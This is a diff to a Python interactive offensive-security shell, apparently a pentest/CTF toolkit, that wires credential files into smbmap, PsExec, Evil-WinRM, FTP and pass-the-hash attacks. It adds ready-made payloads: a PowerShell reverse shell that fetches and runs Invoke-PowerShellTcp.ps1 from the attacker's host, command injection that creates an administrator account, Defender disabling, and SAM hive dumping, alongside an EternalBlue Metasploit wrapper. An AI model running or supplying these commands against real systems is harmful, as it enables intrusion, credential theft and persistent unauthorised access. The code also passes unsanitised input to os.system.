@@ -2346,26 +2346,58 @@ class LazyOwnShell(Cmd):
 
         :param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
         :returns: None"""
-        
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
-        
+        path = os.getcwd()
+        path_cred = f"{path}/sessions/credentials.txt"
         if not check_rhost(rhost):
             return
 
         if not check_lhost(lhost):
             return
 
-        if not line:
-            print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
-            os.system(f"smbmap -H {rhost} -u 'deefbeef'")
-            return
+        if not os.path.exists(path_cred):
+            if not line:
+                print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
+                os.system(f"smbmap -H {rhost} -u 'deefbeef'")
+                return
 
-        print_msg(f"Try... smbmap -H {rhost} -R {line}")
-        os.system(f"smbmap -H {rhost} -R {line}")
-        print_msg(
-            f'exploit smb if is posible mount -t cifs "//{lhost}/documents" /mnt/smb '
-        )
+            print_msg(f"Try... smbmap -H {rhost} -R {line}")
+            os.system(f"smbmap -H {rhost} -R {line}")
+            print_msg(
+                f'exploit smb if is posible mount -t cifs "//{lhost}/documents" /mnt/smb '
+            )
+            return
+        else:
+
+            if line:
+                with open(path_cred, "r") as file:
+                    for file_line in file:
+                        params = file_line.split(":")
+                        user = params[0]
+                        passwd = params[1].replace("\n", "")
+                        command = f"smbmap -u {user} -p {passwd} -H {rhost} -R {line}"
+                        copy2clip(passwd)
+                        print_msg(command)
+                        os.system(command)
+                        print_msg(
+                            f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
+                        )
+                        return
+            else:
+                with open(path_cred, "r") as file:
+                    for file_line in file:
+                        params = file_line.split(":")
+                        user = params[0]
+                        passwd = params[1].replace("\n", "")
+                        command = f"smbmap -u {user} -p {passwd} -H {rhost}"
+                        copy2clip(passwd)
+                        print_msg(command)
+                        os.system(command)
+                        print_msg(
+                            f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
+                        )
+                
         return
 
     def do_getnpusers(self, line):
@@ -2397,30 +2429,45 @@ class LazyOwnShell(Cmd):
 
     def do_psexec(self, line):
         """
-        Copies the `rhost` IP address to the clipboard and updates the prompt with the IP address.
+        Executes the Impacket PSExec tool to attempt remote execution on the specified target.
 
-        1. Retrieves the `rhost` IP address from the `self.params` parameter.
-        2. Checks if the `rhost` is valid using `check_rhost()`. If invalid, the function returns without making changes.
-        3. If `line` is 'clean', resets the custom prompt to its original state.
-        4. Otherwise, updates the prompt to include the `rhost` IP address in the specified format.
-        5. Copies the `rhost` IP address to the clipboard using `xclip`.
-        6. Prints a message confirming that the IP address has been copied to the clipboard.
+        This function performs the following actions:
+        1. Checks if the provided target host (`rhost`) is valid.
+        2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
+        and allows the user to select which file to use for executing the command.
+        3. If the `line` argument is not "pass", it assumes execution without a password (using the current credentials).
+        4. Copies the `rhost` IP address to the clipboard for ease of use.
 
-        :param line: This parameter determines whether the prompt should be reset or updated with the IP address.
-        :type line: str
-        :returns: None
+        Parameters:
+        line (str): A command argument to determine the action.
+                    If "pass", the function searches for credential files and authenticates using the selected file.
+                    Otherwise, it executes PSExec without a password using the `rhost` IP.
 
-        Manual execution:
-        To manually run this command, use the following syntax:
-            rhost <line>
-        Replace `<line>` with 'clean' to reset the prompt, or any other string to update the prompt with the IP address.
-        """
-
+        Returns:
+        None
+        """  
         rhost = self.params["rhost"]
+        
+        
         if not check_rhost(rhost):
             return
-        rhost = self.params["rhost"]
-        os.system(f"impacket-psexec administrator@{rhost}")
+
+        if line == "pass":
+            credentials = get_credentials()
+            if not credentials:
+                return
+
+            for user, passwd in credentials:
+                command = f"impacket-psexec {user}:'{passwd}'@{rhost}"
+                print_msg(command)
+                os.system(command)
+            return
+
+        else:
+            command = f"impacket-psexec administrator@{rhost}"
+            print_msg(command)
+            os.system(command)
+        return
 
     def do_rpcdump(self, line):
         """
@@ -3983,7 +4030,8 @@ class LazyOwnShell(Cmd):
 
         This function performs the following actions:
         1. Validates the input line to ensure it contains a colon (`:`), indicating the presence of both a username and password.
-        2. Writes the valid input to `sessions/credentials.txt`.
+        2. Backs up the existing `credentials.txt` file if it exists, renaming it to `credentials_{username}.txt` based on the existing username.
+        3. Writes the valid input to `sessions/credentials.txt`.
 
         Usage:
             createcredentials user:password
@@ -4007,15 +4055,27 @@ class LazyOwnShell(Cmd):
         """
 
         print_msg(
-            f"Creando archivo sessions/credentials.txt con el siguiente contenido {line}{RESET}"
+            f"Creating file{GREEN} sessions/credentials.txt with content: {YELLOW}{line}{RESET}"
         )
+
         if ":" in line:
-            os.system(f"echo '{line}' > sessions/credentials.txt")
+            credentials_file_path = 'sessions/credentials.txt'
+            
+            if os.path.exists(credentials_file_path):
+                with open(credentials_file_path, 'r') as file:
+                    existing_credentials = file.readline().strip()
+                    existing_username = existing_credentials.split(":")[0]
+                    backup_file_path = f'sessions/credentials_{existing_username}.txt'
+                    os.rename(credentials_file_path, backup_file_path)
+                    print_msg(f"Archivo existente respaldado como {backup_file_path}{RESET}")
+
+            os.system(f"echo '{line}' > {credentials_file_path}")
         else:
             print_error(
                 f"El archivo debe tener este formato usuario:contraseña ej: administrator:passwordadministrator123&!  {line}{RESET}"
             )
             return
+
         return
 
     def do_createcookie(self, line):
@@ -5046,7 +5106,11 @@ class LazyOwnShell(Cmd):
             ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
             ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
             ("PYPYKATZ", "pypykatz registry --sam sam system"),
-            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }')
+            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
+            ("WIN WEB Inyection", "abc.txt | powershell -enc "),
+            ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
+            ("WIN ReverShell winbase64encode", f'echo -n "IEX(new-objectnet.webclient).downloadstring(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
+            ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1")
         ]
         
         for idx, (alias, cmd) in enumerate(commands_list):
@@ -5505,18 +5569,19 @@ class LazyOwnShell(Cmd):
 
         rport = line  # El puerto será proporcionado como argumento 'line'
         credentials_file = "./sessions/credentials.txt"
-        if not os.path.exists:
-            print_error(
-                "sessions/creadentials.txt must exist ex: createcredentials user:password "
-            )
-            return
-
-        with open(credentials_file, "r") as file:
-            for line in file:
-                user, passwd = line.strip().split(":")
-                command = f"sshpass -p {passwd} ftp {user}@{rhost}"
-                print_msg(command)
-                os.system(command)
+        if not os.path.exists(credentials_file):
+            command = f"ftp anonymouse@{rhost}"
+            command_ftp = "user anonymous ''"
+            copy2clip(command_ftp)
+            print_msg(command)
+            os.system(command)
+        else:
+            with open(credentials_file, "r") as file:
+                for line in file:
+                    user, passwd = line.strip().split(":")
+                    command = f"sshpass -p {passwd} ftp {user}@{rhost}"
+                    print_msg(command)
+                    os.system(command)
         return
 
     def do_cports(self, line):
@@ -10043,54 +10108,53 @@ class LazyOwnShell(Cmd):
 
         This function performs the following actions:
         1. Checks if the provided target host (`rhost`) is valid.
-        2. If the `line` argument is "pass", it reads credentials from the `credentials.txt` file and attempts authentication for each user-password pair using Evil-WinRM.
+        2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
+        and allows the user to select which file to use for executing the command.
         3. If `line` is not "pass", it prints an error message indicating the correct usage.
 
         Parameters:
-        line (str): A command argument to determine the action. 
-                    If "pass", the function reads credentials from the `credentials.txt` file and attempts to authenticate.
+        line (str): A command argument to determine the action.
+                    If "pass", the function searches for credential files and authenticates using the selected file.
                     If not "pass", it prints an error message with usage instructions.
 
         Returns:
         None
-        """        
+        """     
         rhost = self.params["rhost"]
         path = os.getcwd()
         users_txt = f"{path}/sessions/users.txt"
         hash_txt = f"{path}/sessions/hash.txt"
         url = self.params["url"]
-        domain = get_domain(url)
-        
+        domain = self.params["domain"]
+
         if not check_rhost(rhost):
             return
 
-        if not line:
-            path_cred = "sessions/credentials.txt"        
+        if line == "pass":
             
-            sub = input("enter the subdomain example dc01: ")
-            if not os.path.exists(path_cred):
-                print_error("you need credentials.txt exec: createcredentials admin:admin")
-                user = input("Enter the username: ")
+            credentials = get_credentials()
+            if not credentials:
+                return  
 
-                command = f"evil-winrm -i {sub}.{domain} -u \"{user}\" -r INFILTRATOR.HTB"
-            with open(path_cred, "r") as file:
+            for user, passwd in credentials:
+                command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
+                print_msg(command)
+                os.system(command)
+            return
+        elif line.startswith("hash"):
+            if not os.path.exists(hash_txt):
+                print_error(f"No se encontró {hash_txt}.")
+                return
+            with open(hash_txt, "r") as file:
                 for file_line in file:
-                    params = file_line.split(":")
-                    user = params[0]
-                    passwd = params[1].replace("\n", "")
-                    command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
+                    print(file_line.strip())
+                    command = f"evil-winrm -i {rhost} -u Administrator -H '{file_line.strip()}'"
                     print_msg(command)
                     os.system(command)
             return
         else:
-            if line.startswith("hash"):
-                with open(hash_txt, "r") as file:
-                    for file_line in file:
-                        print(file_line)
-                command = f"evil-winrm -i {rhost} -u Administrator -H '{file_line.strip()}'"
-                print_msg(command)
-                os.system(command)
-        return
+            print_error("Uso incorrecto. Usa 'pass' para autenticar o 'hash' para usar hashes.")
+            return
 
     def do_getTGT(self, line):
         """
@@ -12547,7 +12611,6 @@ class LazyOwnShell(Cmd):
         :returns: None
         """
 
-        # Retrieve required parameters
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
@@ -12556,7 +12619,6 @@ class LazyOwnShell(Cmd):
             print_warn("RHOST and LHOST must be specified.")
             return
 
-        # Create the Metasploit resource script for EternalBlue
         rc_file_path = "/tmp/eternalblue.rc"
         with open(rc_file_path, "w") as file:
             file.write(f"""
@@ -12567,16 +12629,61 @@ class LazyOwnShell(Cmd):
             run
             """)
 
-        # Execute the Metasploit resource script
         subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
 
-        # Clean up the temporary file
         if os.path.exists(rc_file_path):
             os.remove(rc_file_path)
 
         print_msg(f"Executed EternalBlue exploitation on {rhost} with listener {lhost}.")
         return
 
+    def do_cve(self, line):
+        """
+        Search for a CVE using the CIRCL API.
+
+        This function sends a GET request to the CIRCL API to retrieve CVE details 
+        and prints relevant information to the screen.
+
+        :param line: A string containing the CVE ID (optional).
+        :returns: None
+        """
+        if not line.strip():
+            line = generate_random_cve_id()
+            print_msg(f"No CVE ID provided. Generated ID: {line}")
+
+        url = f"https://cve.circl.lu/api/cve/{line}"
+
+        try:
+            response = requests.get(url)
+            
+            if response.status_code != 200:
+                print_error(f"Failed to retrieve data: HTTP {response.status_code}")
+                return
+            
+            cve_data = response.json()
+
+            cwe = cve_data.get("cwe", "No CWE info")
+            cve_id = cve_data.get("id", "No ID")
+            references = cve_data.get("references", [])
+            summary = cve_data.get("summary", "No summary available")
+            assigner = cve_data.get("assigner", "No assigner info")
+            published = cve_data.get("Published", "No publish date")
+            modified = cve_data.get("Modified", "No modification date")
+
+            print_msg(f"[*] CWE: {cwe}")
+            print_msg(f"[*] ID: {cve_id}")
+            print_msg(f"[*] References: {', '.join(references) if references else 'No references'}")
+            print_msg(f"[*] Summary: {summary}")
+            print_msg(f"[*] Assigner: {assigner}")
+            print_msg(f"[*] Published: {published}")
+            print_msg(f"[*] Modified: {modified}")
+        
+        except requests.exceptions.RequestException as req_e:
+            print_error(f"A request error occurred: {req_e}")
+        except ValueError as json_e:
+            print_error(f"Error parsing JSON response: {json_e}")
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
 
 if __name__ == "__main__":
     p = LazyOwnShell()
